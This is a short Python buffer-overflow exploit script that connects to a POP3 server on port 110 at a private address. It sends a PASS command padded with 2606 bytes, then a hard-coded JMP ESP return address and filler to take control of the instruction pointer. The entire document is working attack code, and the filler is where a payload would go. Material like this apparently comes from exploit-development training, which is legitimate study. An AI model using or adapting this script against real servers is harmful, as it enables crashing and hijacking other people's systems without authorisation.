#!/usr/bin/python
import socket
import struct

jmp_esp= struct.pack("<I", 0x5F4A358F)

buffer="A"*2606+ jmp_esp  + "C"*(3500-2606-4)
print ("Size %s"%(len(buffer)))
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.0.134',110))
s.recv(1024)
s.send('USER test\r\n')
s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
s.send('QUIT\r\n')